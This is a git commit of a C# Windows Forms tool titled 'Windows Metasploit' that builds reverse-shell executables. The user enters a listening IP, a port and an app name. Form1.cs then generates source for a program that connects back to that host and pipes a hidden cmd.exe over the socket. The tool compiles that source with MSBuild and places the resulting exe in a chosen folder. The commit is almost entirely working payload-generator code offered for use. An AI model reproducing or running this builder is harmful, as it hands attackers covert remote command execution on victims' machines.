44efaf117230b2b4534bf7d1b33e9a403ac3ee93
toballz <42551340+toballz@users.noreply.github.com>
2020-01-06 03:18:34 -0500

    Add files via upload

---
+++ Windows Metasploit/Windows Metasploit/Form1.Designer.cs
@@ -0,0 +1,168 @@
+﻿namespace Windows_Metasploit
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.listeningip = new System.Windows.Forms.TextBox();
+            this.listeningport = new System.Windows.Forms.TextBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.StartBuild = new System.Windows.Forms.Button();
+            this.landingdir = new System.Windows.Forms.TextBox();
+            this.label3 = new System.Windows.Forms.Label();
+            this.appname = new System.Windows.Forms.TextBox();
+            this.movedfiledir = new System.Windows.Forms.Button();
+            this.label4 = new System.Windows.Forms.Label();
+            this.SuspendLayout();
+            // 
+            // listeningip
+            // 
+            this.listeningip.Location = new System.Drawing.Point(126, 42);
+            this.listeningip.Name = "listeningip";
+            this.listeningip.Size = new System.Drawing.Size(260, 20);
+            this.listeningip.TabIndex = 0;
+            // 
+            // listeningport
+            // 
+            this.listeningport.Location = new System.Drawing.Point(126, 68);
+            this.listeningport.Name = "listeningport";
+            this.listeningport.Size = new System.Drawing.Size(100, 20);
+            this.listeningport.TabIndex = 1;
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(12, 45);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(62, 13);
+            this.label1.TabIndex = 2;
+            this.label1.Text = "Listening IP";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(12, 71);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(82, 13);
+            this.label2.TabIndex = 3;
+            this.label2.Text = "Listening PORT";
+            // 
+            // StartBuild
+            // 
+            this.StartBuild.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.StartBuild.Location = new System.Drawing.Point(85, 131);
+            this.StartBuild.Name = "StartBuild";
+            this.StartBuild.Size = new System.Drawing.Size(224, 47);
+            this.StartBuild.TabIndex = 4;
+            this.StartBuild.Text = "Build";
+            this.StartBuild.UseVisualStyleBackColor = true;
+            this.StartBuild.Click += new System.EventHandler(this.StartBuild_Click);
+            // 
+            // landingdir
+            // 
+            this.landingdir.Location = new System.Drawing.Point(126, 94);
+            this.landingdir.Name = "landingdir";
+            this.landingdir.Size = new System.Drawing.Size(178, 20);
+            this.landingdir.TabIndex = 5;
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Cursor = System.Windows.Forms.Cursors.Default;
+            this.label3.Location = new System.Drawing.Point(12, 97);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(97, 13);
+            this.label3.TabIndex = 6;
+            this.label3.Text = "Choose a Directory";
+            // 
+            // appname
+            // 
+            this.appname.Location = new System.Drawing.Point(126, 12);
+            this.appname.Name = "appname";
+            this.appname.Size = new System.Drawing.Size(200, 20);
+            this.appname.TabIndex = 7;
+            // 
+            // movedfiledir
+            // 
+            this.movedfiledir.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.movedfiledir.Location = new System.Drawing.Point(310, 90);
+            this.movedfiledir.Name = "movedfiledir";
+            this.movedfiledir.Size = new System.Drawing.Size(76, 26);
+            this.movedfiledir.TabIndex = 8;
+            this.movedfiledir.Text = "File";
+            this.movedfiledir.UseVisualStyleBackColor = true;
+            this.movedfiledir.Click += new System.EventHandler(this.movedfiledir_Click);
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.Location = new System.Drawing.Point(12, 15);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(55, 13);
+            this.label4.TabIndex = 9;
+            this.label4.Text = "App name";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(395, 190);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.movedfiledir);
+            this.Controls.Add(this.appname);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.landingdir);
+            this.Controls.Add(this.StartBuild);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.listeningport);
+            this.Controls.Add(this.listeningip);
+            this.MaximumSize = new System.Drawing.Size(411, 229);
+            this.MinimumSize = new System.Drawing.Size(411, 229);
+            this.Name = "Form1";
+            this.Text = "Windows Metasploit";
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.TextBox listeningip;
+        private System.Windows.Forms.TextBox listeningport;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Button StartBuild;
+        private System.Windows.Forms.TextBox landingdir;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.TextBox appname;
+        private System.Windows.Forms.Button movedfiledir;
+        private System.Windows.Forms.Label label4;
+    }
+}
+
---
+++ Windows Metasploit/Windows Metasploit/Form1.cs
@@ -0,0 +1,182 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+using System.Threading;
+using System.Windows.Forms;
+
+namespace Windows_Metasploit
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        public string csproj = "kyujyhfgf.csproj";
+        public string maindir = @"C:\ProgramData\Windows _Metasploit\";
+        public string csharpfile = "jkiyujhgfv.cs";
+        public string builffile = @"C:\Users\tobal\Desktop\CSharp2ExE\MSBuild.exe";
+        public string batchfile = "Cqwe.bat";
+        private void StartBuild_Click(object sender, EventArgs e)
+        {
+            if (!Directory.Exists(maindir))
+            {
+                Directory.CreateDirectory(maindir);
+            }
+            if (listeningip.Text != "" && appname.Text != "" && listeningport.Text != "" && landingdir.Text != "")
+            {
+                getreadyallfiles();
+            }
+            else
+            {
+                MessageBox.Show("Fill all of Emm..");
+            }
+        }
+
+        private void getreadyallfiles()
+        {
+            string csprojinner = "<?xml version=\"1.0\" encoding=\"utf-8\"?>"+
+                                            "<Project ToolsVersion=\"15.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n"+
+                                            "  <Import Project=\"$(MSBuildExtensionsPath)\\$(MSBuildToolsVersion)\\Microsoft.Common.props\" Condition=\"Exists('$(MSBuildExtensionsPath)\\$(MSBuildToolsVersion)\\Microsoft.Common.props')\" />\n"+
+                                            "  <PropertyGroup>\n"+
+                                            "    <Configuration Condition=\" '$(Configuration)' == '' \">Debug</Configuration>\n"+
+                                             "   <Platform Condition=\" '$(Platform)' == '' \">AnyCPU</Platform>\n"+
+                                              "  <ProjectGuid>{68D7DF78-3F0F-4232-A4C5-5F1541F936C3}</ProjectGuid>\n"+
+                                               " <OutputType>WinExe</OutputType>\n"+
+                                                "<RootNamespace>"+ appname.Text + ".exe</RootNamespace>\n"+
+                                                "<AssemblyName>"+ appname.Text + ".exe</AssemblyName>\n"+
+                                                "<TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>\n"+
+                                                "<FileAlignment>512</FileAlignment>\n"+
+                                                "<AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>\n"+
+                                                "<Deterministic>true</Deterministic>\n"+
+                                              "</PropertyGroup>\n"+
+                                              "<PropertyGroup Condition=\" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' \">\n"+
+                                              "  <PlatformTarget>AnyCPU</PlatformTarget>\n"+
+                                              "  <DebugSymbols>true</DebugSymbols>\n"+
+                                              "  <DebugType>full</DebugType>\n"+
+                                              "  <Optimize>false</Optimize>\n"+
+                                              "  <OutputPath>bin\\Debug\\</OutputPath>\n"+
+                                              "  <DefineConstants>DEBUG;TRACE</DefineConstants>\n"+
+                                              "  <ErrorReport>prompt</ErrorReport>\n"+
+                                              "  <WarningLevel>4</WarningLevel>\n"+
+                                              "</PropertyGroup>\n"+
+                                              "<PropertyGroup Condition=\" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' \">\n"+
+                                              "  <PlatformTarget>AnyCPU</PlatformTarget>\n"+
+                                              "  <DebugType>pdbonly</DebugType>\n"+
+                                              "  <Optimize>true</Optimize>\n"+
+                                              "  <OutputPath>bin\\Release\\</OutputPath>\n"+
+                                              "  <DefineConstants>TRACE</DefineConstants>\n"+
+                                              "  <ErrorReport>prompt</ErrorReport>\n"+
+                                              "  <WarningLevel>4</WarningLevel>"+
+                                              "</PropertyGroup>"+
+                                              "<ItemGroup>\n"+
+                                              "  <Reference Include=\"System\" />\n"+
+                                             "   <Reference Include=\"System.Core\" />\n"+
+                                             "   <Reference Include=\"System.Xml.Linq\" />\n"+
+                                             "   <Reference Include=\"System.Data.DataSetExtensions\" />\n"+
+                                             "   <Reference Include=\"Microsoft.CSharp\" />\n"+
+                                             "   <Reference Include=\"System.Data\" />\n"+
+                                             "   <Reference Include=\"System.Net.Http\" />"+
+                                             "   <Reference Include=\"System.Xml\" />\n"+
+                                             " </ItemGroup>\n"+
+                                             " <ItemGroup>\n"+
+                                             "   <Compile Include=\""+csharpfile+"\" />\n"+
+                                             " </ItemGroup>\n"+
+                                              "<ItemGroup>\n"+
+                                               " <None Include=\"App.config\" />\n"+
+                                              "</ItemGroup>\n"+
+                                             " <Import Project=\"$(MSBuildToolsPath)\\Microsoft.CSharp.targets\" />\n"+
+                                            "</Project>";
+            using (StreamWriter sd = new StreamWriter(maindir + csproj))
+            {
+                sd.Write(csprojinner);
+            }
+
+            string csharpcode = "using System;using System.Diagnostics;using System.IO;using System.Net.Sockets;using System.Text;"+
+                              "  namespace "+ appname.Text + "{\n"+
+                                        "public class Program{"+
+                                           " static StreamWriter streamWriter;"+
+                                         "   public static void Main(string[] args)"+
+                                           " {"+
+                                                "try{"+
+                                                   " using (TcpClient client = new TcpClient(\""+listeningip.Text+"\", "+listeningport.Text+")){"+
+                                                     "   using (Stream stream = client.GetStream()){"+
+                                                            "using (StreamReader rdr = new StreamReader(stream)){\n"+
+                                                               " streamWriter = new StreamWriter(stream);\n"+
+                                                               " StringBuilder strInput = new StringBuilder();\n"+
+
+                                                              "  Process p = new Process();\n"+
+                                                               " p.StartInfo.FileName = \"cmd.exe\";"+
+                                                               " p.StartInfo.CreateNoWindow = true;\n"+
+                                                               " p.StartInfo.UseShellExecute = false;\n"+
+                                                              "  p.StartInfo.RedirectStandardOutput = true;\n"+
+                                                             "   p.StartInfo.RedirectStandardInput = true;\n"+
+                                                             "   p.StartInfo.RedirectStandardError = true;\n"+
+                                                              "  p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n"+
+                                                              "  p.Start();\n"+
+                                                              "  p.BeginOutputReadLine();\n"+
+
+                                                              "  while (true){\n"+
+                                                                 "  strInput.Append(rdr.ReadLine());\n"+
+                                                                   " //strInput.Append(\"\\n\");\n"+
+                                                                 "   p.StandardInput.WriteLine(strInput);\n"+
+                                                                "    strInput.Remove(0, strInput.Length);\n"+
+                                                               " }\n"+
+                                                          "  }"+
+                                                       " }"+
+                                                  "  }"+
+                                               " }catch (Exception vb) { }"+
+                                           " }"+
+
+                                          "  private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n"+
+                                          "  {\n"+
+                                               " StringBuilder strOutput = new StringBuilder();\n"+
+                                              "  if (!String.IsNullOrEmpty(outLine.Data)){\n"+
+                                                 "   try{\n"+
+                                                   "     strOutput.Append(outLine.Data);\n"+
+                                                    "    streamWriter.WriteLine(strOutput);\n"+
+                                                  "      streamWriter.Flush();\n"+
+                                                  "  }catch (Exception err) { }\n"+
+                                               " }\n"+
+                                           " }\n"+
+
+                                       " }\n"+
+                              "  }";
+            using(StreamWriter uy = new StreamWriter(maindir+ csharpfile))
+            {
+                uy.Write(csharpcode);
+            }
+
+            using(StreamWriter ad = new StreamWriter(maindir + "App.config")){
+                ad.Write("<?xml version=\"1.0\" encoding=\"utf-8\" ?>"+
+                            "<configuration>"+
+                               " <startup> "+
+                                  "  <supportedRuntime version=\"v4.0\" sku=\".NETFramework,Version=v4.7.2\" />"+
+                               " </startup>"+
+                           " </configuration>");
+            }
+
+            using (StreamWriter gg = new StreamWriter(maindir + batchfile))
+            {
+                gg.Write(builffile + " \""+ maindir+csproj + " \""+ Environment.NewLine + "Pause");
+            }
+            Thread.Sleep(1400);
+            Process.Start(maindir + batchfile);
+            while(File.Exists(@"C:\ProgramData\Windows _Metasploit\bin\Debug\" + appname.Text + ".exe"))
+            {
+                File.Move(@"C:\ProgramData\Windows _Metasploit\bin\Debug\" + appname.Text + ".exe", landingdir.Text);
+            }
+        }
+
+        private void movedfiledir_Click(object sender, EventArgs e)
+        {
+            FolderBrowserDialog af = new FolderBrowserDialog();
+
+            if (af.ShowDialog() == DialogResult.OK)
+            {
+                landingdir.Text = af.SelectedPath;
+            }
+        }
+    }
+}
